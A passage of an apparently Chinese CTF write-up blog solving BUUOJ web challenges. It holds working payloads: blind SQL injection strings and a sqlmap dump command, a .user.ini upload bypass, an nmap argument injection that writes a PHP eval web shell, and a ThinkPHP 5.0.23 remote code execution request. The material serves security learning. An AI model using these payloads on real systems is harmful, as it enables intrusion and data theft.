punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Upload file error: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">,</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token variable">$allowtype</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$newfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>访问<code>./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201129212543344.png" class="" title="image-20201129212543344"><p>确认存在文件上传考点，回去找上传点，访问<code>./user.php?page=m4aaannngggeee</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201129212613725.png" class="" title="image-20201129212613725"><p>上传发现</p><img src="/article/Buuoj-WEB-Write-up/image-20201129212720648.png" class="" title="image-20201129212720648"><p>表明无法通过上传一句话木马获得shell</p><p>后来分析代码发现漏洞</p><h5 id="文件名代码执行漏洞"><a href="#文件名代码执行漏洞" class="headerlink" title="文件名代码执行漏洞"></a>文件名代码执行漏洞</h5><img src="/article/Buuoj-WEB-Write-up/image-20201129212856576.png" class="" title="image-20201129212856576"><p>扫目录</p><img src="/article/Buuoj-WEB-Write-up/image-20201129213023625.png" class="" title="image-20201129213023625"><p>flag即在<code>flag_233333</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201129213121552.png" class="" title="image-20201129213121552"><p>成功</p><hr><h2 id="Black-Watch-入群题-Web"><a href="#Black-Watch-入群题-Web" class="headerlink" title="[Black Watch 入群题]Web"></a>[Black Watch 入群题]Web</h2><p>打开</p><img src="/article/Buuoj-WEB-Write-up/image-20201202104315913.png" class="" title="image-20201202104315913"><p>有登陆，尝试登陆界面sql注入</p><img src="/article/Buuoj-WEB-Write-up/image-20201202104343337.png" class="" title="image-20201202104343337"><p>查看源码，在webpack发现猫腻</p><img src="/article/Buuoj-WEB-Write-up/image-20201202104718292.png" class="" title="image-20201202104718292"><p>登录界面注入无果<img src="/article/Buuoj-WEB-Write-up/image-20201202104751986.png" class="" title="image-20201202104751986"></p><p>转<code>content_list.php</code></p><p>发现请求文章时会带id参数，尝试注入</p><img src="/article/Buuoj-WEB-Write-up/image-20201202105153401.png" class="" title="image-20201202105153401"><img src="/article/Buuoj-WEB-Write-up/image-20201202105351447.png" class="" title="image-20201202105351447"><p>确认存在注入</p><p>过滤了<code>+</code> <code>空格</code> <code>and</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201202105230126.png" class="" title="image-20201202105230126"><p> 输入数据库不存在的id或产生语法时没有回显，初步判断为布尔盲注</p><h5 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h5><p>写个tamper替换空格等字符</p><pre class="language-shell" data-language="shell"><code class="language-shell">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;49a772d8-a3af-40d4-89c2-eaa7bc0fb974.node3.buuoj.cn&#x2F;backend&#x2F;content_detail.php?id&#x3D;0&quot;  --delay&#x3D;0.07 --dbms&#x3D;mysql --technique&#x3D;B --tamper&#x3D;mytamper.py --user-agent&#x3D;&quot;chrome&quot; --risk&#x3D;3 --dump</code></pre><p>参数：</p><pre class="language-none"><code class="language-none">--delay 延迟注入，网站快速注入会返回429，Too Many Requirements--dbms 数据库类型--technique 注入方式，这里B指bool布尔盲注--tamper 使用的tamper--user-agent 题目判断UA--risk 风险等级--dump 数据库全部拖下来</code></pre><p>运行提示</p><pre class="language-shell" data-language="shell"><code class="language-shell">[INFO] GET parameter &#39;id&#39; appears to be &#39;OR boolean-based blind - WHERE or HAVING clause&#39; injectable</code></pre><p>证实为布尔盲注</p><img src="/article/Buuoj-WEB-Write-up/image-20201202110359111.png" class="" title="image-20201202110359111"><p>发现跑出了数据库名<code>news</code>但跑不出表名</p><img src="/article/Buuoj-WEB-Write-up/image-20201202110529783.png" class="" title="image-20201202110529783"><p>参考师傅的答案，写脚本开始跑</p><p>payload：</p><pre class="language-none"><code class="language-none">1^if((select(ascii(substr((select(database())),&#123;&#125;,1))&#x3D;&#123;&#125;)),1,0)^1#</code></pre><p>一段一段分析</p><pre class="language-none"><code class="language-none">database() : 数据库(select(database()) : 选择数据库substr函数 : 指截取参数1字符串，从参数2的位置开始截取参数3位substr((select(database())),&#123;&#125;,1) : 指从数据库名第&#123;&#125;的位置截取一位ascii(substr((select(database())),&#123;&#125;,1)) : 指转化为ASCII码值select : 如下图所示select(ascii(substr((select(database())),&#123;&#125;,1))&#x3D;&#123;&#125;) : select ascii&#x3D;&#123;&#125;，判断是否和某个ascii码值相等，如图if(a,1,0) : 相当于三目运算符 :? ,即 a:1?0^ : 异或符</code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201202112853423.png" class="" title="image-20201202112853423"><img src="/article/Buuoj-WEB-Write-up/image-20201202112804610.png" class="" title="image-20201202112804610"><img src="/article/Buuoj-WEB-Write-up/image-20201202112928978.png" class="" title="image-20201202112928978"><p>很明显，第一个<code>&#123;&#125;</code>指的是数据库名的第i位，第二个<code>&#123;&#125;</code>指对第i的ASCII码值进行比较</p><img src="/article/Buuoj-WEB-Write-up/image-20201202110930572.png" class="" title="image-20201202110930572"><p>数据库名为<code>news</code>，继续跑表名</p><p>payload：</p><pre class="language-none"><code class="language-none">1^if((select(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#39;news&#39;)),&#123;&#125;,1))&#x3D;&#123;&#125;)),1,0)^1#</code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201202113058557.png" class="" title="image-20201202113058557"><p>再跑列名</p><p>payload：</p><pre class="language-none"><code class="language-none">1^if((select(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;admin&#39;)),&#123;&#125;,1))&#x3D;&#123;&#125;)),1,0)^1#</code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201202113123832.png" class="" title="image-20201202113123832"><p>跑数据了</p><p>payload：</p><pre class="language-none"><code class="language-none">1^if((select(ascii(substr((select(group_concat(id))from(admin)),&#123;&#125;,1))&#x3D;&#123;&#125;)),1,0)^1#1^if((select(ascii(substr((select(group_concat(username))from(admin)),&#123;&#125;,1))&#x3D;&#123;&#125;)),1,0)^1#1^if((select(ascii(substr((select(group_concat(password))from(admin)),&#123;&#125;,1))&#x3D;&#123;&#125;)),1,0)^1#1^if((select(ascii(substr((select(group_concat(is_enable))from(admin)),&#123;&#125;,1))&#x3D;&#123;&#125;)),1,0)^1#</code></pre><p>其实没必要跑那么多，（跑着好玩</p><p>出来表有两行</p><img src="/article/Buuoj-WEB-Write-up/image-20201202113806290.png" class="" title="image-20201202113806290"><p><code>username</code>：3ab8d14c,dcaf5eed</p><img src="/article/Buuoj-WEB-Write-up/image-20201202114112390.png" class="" title="image-20201202114112390"><p><code>password</code>：2a790c21,f285e92a</p><img src="/article/Buuoj-WEB-Write-up/image-20201202114324916.png" class="" title="image-20201202114324916"><p><code>is_enable</code>：0,1</p><img src="/article/Buuoj-WEB-Write-up/image-20201202114435825.png" class="" title="image-20201202114435825"><p>直接去拿enbale的登陆即可</p><p>表结构是这样的</p><p>数据库名:news</p><p>表名:admin</p><table><thead><tr><th>id</th><th>username</th><th>password</th><th>is_enable</th></tr></thead><tbody><tr><td>1</td><td>3ab8d14c</td><td>2a790c21</td><td>0</td></tr><tr><td>2</td><td>dcaf5eed</td><td>f285e92a</td><td>1</td></tr></tbody></table><p>登陆成功</p><img src="/article/Buuoj-WEB-Write-up/image-20201202114303580.png" class="" title="image-20201202114303580"><hr><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><h5 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h5><img src="/article/Buuoj-WEB-Write-up/image-20201203151206446.png" class="" title="image-20201203151206446"><p>上来很直白，传个码看看</p><img src="/article/Buuoj-WEB-Write-up/image-20201203151245517.png" class="" title="image-20201203151245517"><p>改后缀</p><img src="/article/Buuoj-WEB-Write-up/image-20201203151428059.png" class="" title="image-20201203151428059">文件内容还检查，加`GIF98a`可以<img src="/article/Buuoj-WEB-Write-up/image-20201203151803538.png" class="" title="image-20201203151803538"><p>会返回上传文件夹目录的数组，目录穿越上传不行，php过滤死了，传含码图片，过滤<code>&lt;?</code>，而<code>&lt;%</code>也不解析，路走不通。</p><p>传个<code>.htaccess</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201203152651182.png" class="" title="image-20201203152651182"><p>但是好像没解析…</p><img src="/article/Buuoj-WEB-Write-up/image-20201203152715211.png" class="" title="image-20201203152715211"><p>经查询，nginx使用<code>.user.ini</code>自定义设置</p><p>于是传个<code>.user.ini</code></p><pre class="language-ini" data-language="ini"><code class="language-ini">.user.iniGIF89a                  //绕过exif_imagetype()<span class="token constant">auto_prepend_file</span><span class="token attr-value"><span class="token punctuation">=</span>gyy.jpg //指定在主文件之前自动解析的文件的名称，并包含该文件，就像使用require函数调用它一样。它包含在所有php文件前先执行</span><span class="token constant">auto_append_file</span><span class="token attr-value"><span class="token punctuation">=</span>gyy.jpg  //解析后进行包含，它包含在所有php文件执行后执行</span></code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201203161427723.png" class="" title="image-20201203161427723"><p>ok,再传码</p><img src="/article/Buuoj-WEB-Write-up/image-20201203161504788.png" class="" title="image-20201203161504788"><p>然后直接访问<code>index.php</code>就可以了，因为<code>.user.ini</code>里写了，提前加载了<code>gyy.jpg</code>文件，而里面是我们写好的码，shell直接连上</p><img src="/article/Buuoj-WEB-Write-up/image-20201203161829593.png" class="" title="image-20201203161829593"><hr><h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><p>记录一道特殊的题， 很简单的web题，但是需要对java容器和项目存放位置比较了解，作为web选手，应该要对几大语言的容器，项目环境，有所了解。</p><p>考点：<strong>WEB-INF/web.xml泄露</strong></p><pre class="language-none"><code class="language-none">WEB-INF主要包含一下文件或目录:&#x2F;WEB-INF&#x2F;web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。&#x2F;WEB-INF&#x2F;classes&#x2F;：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中&#x2F;WEB-INF&#x2F;lib&#x2F;：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件&#x2F;WEB-INF&#x2F;src&#x2F;：源码目录，按照包名结构放置各个java文件。&#x2F;WEB-INF&#x2F;database.properties：数据库配置文件漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201208175741483.png" class="" title="image-20201208175741483"><p>打开为登陆界面，SQL注入无果，点<code>help</code>，发现url变化为<code>./Download?filename=help.docx</code></p><p>猜测源码泄露，尝试伪协议读取源码<code>php://filter/convert.base64-encode/resource=help.docx</code>发现报错为<code>java.io.FileNotFoundException:&#123;php://filter/convert.base64-encode/resource=help.docx&#125;</code></p><p>结合题目名，猜测JAVA-WEB应用</p><p>报错是tomcat，尝试包含tomcat的web.xml，更改方式为POST请求，传参<code>filename=WEB-INF/web.xml</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201208180232236.png" class="" title="image-20201208180232236"><p>尝试请求<code>/Flag</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201208180450678.png" class="" title="image-20201208180450678"><p> 结合tomcat的项目存放路径经验试试下载FlagController.class </p><p>传参<code>filename=WEB-INF/classes/com/wm/ctf/FlagController.class</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201208180558946.png" class="" title="image-20201208180558946"><p>直接访问下载也行，抓包请求也行，base64解码一下发现flag</p><img src="/article/Buuoj-WEB-Write-up/image-20201208180825474.png" class="" title="image-20201208180825474"><hr><h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><p>nmap工具的利用</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'REMOTE_ADDR'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"glzjin"</span><span class="token punctuation">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token single-quoted-string string">'you are in sandbox '</span><span class="token punctuation">.</span><span class="token variable">$sandbox</span><span class="token punctuation">;</span>    @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span><span class="token punctuation">.</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>考两个函数<code>escapeshellarg</code></p><p> <strong>escapeshellcmd()</strong> 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 </p><p><code>escapeshellarg</code></p><p> <strong>escapeshellarg()</strong> 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。 </p><p>然而之前就爆出了漏洞… 当先使用 escapeshellarg 再使用 escapeshellcmd 时，就可能导致命令参数注入。 </p><p>如</p><p><code>curl &#39;127.0.0.1&#39;\\&#39;&#39; -v -d a=1\&#39;</code></p><p>相当于<code>curl 127.0.0.1\ -v -d a=1&#39;</code></p><p>字符转义了</p><p>查阅nmap帮助手册<code>nmap -h</code></p><p>首先想读取文件，利用<code>-iL</code>参数</p><img src="/article/Buuoj-WEB-Write-up/image-20201208184745868.png" class="" title="image-20201208184745868"><p>发现不行，cmd可以，但执行后没有回显，以下为本地环境</p><img src="/article/Buuoj-WEB-Write-up/image-20201208190824314.png" class="" title="image-20201208190824314"><img src="/article/Buuoj-WEB-Write-up/image-20201208190921276.png" class="" title="image-20201208190921276"><p>关键在于没法构造，毕竟两函数有转义的，于是有了另一种方法，输出。</p><p>利用<code>-oG</code>参数</p><img src="/article/Buuoj-WEB-Write-up/image-20201208184653935.png" class="" title="image-20201208184653935"><p>直接写一句话木马就好了</p><p>payload=<code>./?host=&#39;&lt;?php eval($_POST[gyy]);?&gt; -oG shell.php &#39;</code></p><p>最后和单引号要有空格，因为让system执行时最后的参数是<code>shell.php</code>而不是<code>shell.php\&#39;</code>，因为 <strong>escapeshellarg()**和</strong>escapeshellcmd()** 有转义，单引号是因为函数会检查字符串匹配引号的情况</p><img src="/article/Buuoj-WEB-Write-up/image-20201208193014462.png" class="" title="image-20201208193014462"><p>查看文件</p><img src="/article/Buuoj-WEB-Write-up/image-20201208193048924.png" class="" title="image-20201208193048924"><p>拿到shell</p><img src="/article/Buuoj-WEB-Write-up/image-20201208193135957.png" class="" title="image-20201208193135957"><p>本地文件是这样的，可以看到包含了一句话木马</p><img src="/article/Buuoj-WEB-Write-up/image-20201208193533711.png" class="" title="image-20201208193533711"><hr><h2 id="GKCTF2020-cve版签到"><a href="#GKCTF2020-cve版签到" class="headerlink" title="[GKCTF2020]cve版签到"></a>[GKCTF2020]cve版签到</h2><h5 id="cve-2020-7066"><a href="#cve-2020-7066" class="headerlink" title="cve-2020-7066"></a>cve-2020-7066</h5><p> <strong>将get_headers（）与用户提供的URL一起使用时</strong>，如果URL包含零（\ 0）字符，则URL将被静默地<strong>截断</strong>。<strong>这可能会导致某些软件对get_headers（）的目标做出错误的假设，并可能将某些信息发送到错误的服务器。</strong> </p><p>题目讲明为CVE，排除SSRF</p><p>在响应头中发现hint</p><img src="/article/Buuoj-WEB-Write-up/image-20201208195802041.png" class="" title="image-20201208195802041"><p>访问<code>./?url=http://localhost%00www.ctfhub.com</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201208195922474.png" class="" title="image-20201208195922474"><p><code>Tips: Host must be end with &#39;123&#39;</code></p><p>访问<code>./?url=http://127.0.0.123%00www.ctfhub.com</code>即可</p><img src="/article/Buuoj-WEB-Write-up/image-20201208200037696.png" class="" title="image-20201208200037696"><p>主要考一个CVE，记录一下</p><hr><h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>git泄露</p><p>一点提示都没有！可恶</p><p><code>robots.txt</code>没有，响应头没有，随手访问了个<code>./.git/</code>结果真有，直接上GitHack</p><img src="/article/Buuoj-WEB-Write-up/image-20201208202421537.png" class="" title="image-20201208202421537"><p>强烈谴责！GitHack重新下个就好了，旧的这个还不管用，GitHack还有假的？？？</p><img src="/article/Buuoj-WEB-Write-up/image-20201208203755631.png" class="" title="image-20201208203755631"><p>得到源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"flag在哪里呢？&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token single-quoted-string string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/[a-z,_]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// echo $_GET['exp'];</span>                @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"还差一点哦！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"再好好想想！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"还想读flag，臭弟弟！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// highlight_file(__FILE__);</span><span class="token delimiter important">?></span></span></code></pre><p>很好，看到这个<code>&#39;;&#39; === preg_replace(&#39;/[a-z,_]+\((?R)?\)/&#39;, NULL, $_GET[&#39;exp&#39;]</code>妥妥的无参数RCE</p><p>过滤一堆</p><p>先扫当前目录</p><p>payload=<code>./?exp=print_r(scandir(current(localeconv())));</code></p><pre class="language-shell" data-language="shell"><code class="language-shell">localeconv(): 返回一包含本地数字及货币格式信息的数组。如下图current(): 取数组中第一个元素，返回数组中的当前单元。current(localeconv()): 取符号.scandir(): 扫描目录scandir(current(localeconv()))： 等同于scandir(.)，即扫描当前目录print_r()： 输出</code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201208205457822.png" class="" title="image-20201208205457822"><p>localeconv()如图所示</p><img src="/article/Buuoj-WEB-Write-up/image-20201208205704606.png" class="" title="image-20201208205704606"><p>current(localeconv())取到了符号.</p><img src="/article/Buuoj-WEB-Write-up/image-20201208205956327.png" class="" title="image-20201208205956327"><p>发现了flag.php</p><p>下面要取flag.php中的内容，flag.php在倒数第二组</p><p>由于没有禁用session，利用session<del>（我最喜欢</del></p><img src="/article/Buuoj-WEB-Write-up/image-20201208210427209.png" class="" title="~"><p>其他方法</p><p>payload=<code>./?exp=readfile(array_rand(array_flip(scandir(current(localeconv())))));</code></p><pre class="language-none"><code class="language-none">array_flip()： 交换数组的键和值array_rand()： 从数组中随机取出一个或多个单元readfile()： 读文件</code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201208211502701.png" class="" title="image-20201208211502701"><p>有点小运气嗷，可以写脚本跑，反正随机嘛…概率问题</p><p>读源码方法</p><pre class="language-none"><code class="language-none">file_get_contents()： 本题被banview-source:highlight_file()show_source()readfile()</code></pre><hr><h2 id="BJDCTF-2nd-old-hack"><a href="#BJDCTF-2nd-old-hack" class="headerlink" title="[BJDCTF 2nd]old-hack"></a>[BJDCTF 2nd]old-hack</h2><h5 id="thinkphp5-0-23-远程代码执行-漏洞"><a href="#thinkphp5-0-23-远程代码执行-漏洞" class="headerlink" title="thinkphp5.0.23 远程代码执行 漏洞"></a>thinkphp5.0.23 远程代码执行 漏洞</h5><p>payload：</p><p>POST</p><pre class="language-none"><code class="language-none">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;cat &#x2F;flag</code></pre><hr><h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><img src="/article/Buuoj-WEB-Write-up/image-20201210190510038.png" class="" title="image-20201210190510038"><p>打开一会发现网页自动刷新了，抓包看看</p><img src="/article/Buuoj-WEB-Write-up/image-20201210190602388.png" class="" title="image-20201210190602388"><p>自动刷新</p><pre class="language-none"><code class="language-none">setTimeout(&quot;document.form1.submit()&quot;,5000)</code></pre><p>怀疑调用函数，尝试传参</p><pre class="language-none"><code class="language-none">func&#x3D;file_get_contents&amp;p&#x3D;index.php</code></pre><p>得到源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$disable_fun</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"exec"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"shell_exec"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"system"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"passthru"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"proc_open"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"show_source"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"phpinfo"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"popen"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"dl"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"eval"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"proc_terminate"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"touch"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"escapeshellcmd"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"escapeshellarg"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"assert"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"substr_replace"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"call_user_func_array"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"call_user_func"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"array_filter"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"array_walk"</span><span class="token punctuation">,</span>  <span class="token double-quoted-string string">"array_map"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"registregister_shutdown_function"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"register_tick_function"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"filter_var"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"filter_var_array"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"uasort"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"uksort"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"array_reduce"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"array_walk"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"array_walk_recursive"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"pcntl_exec"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"fopen"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"fwrite"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"file_put_contents"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$a</span><span class="token operator">=</span> <span class="token function">gettype</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span 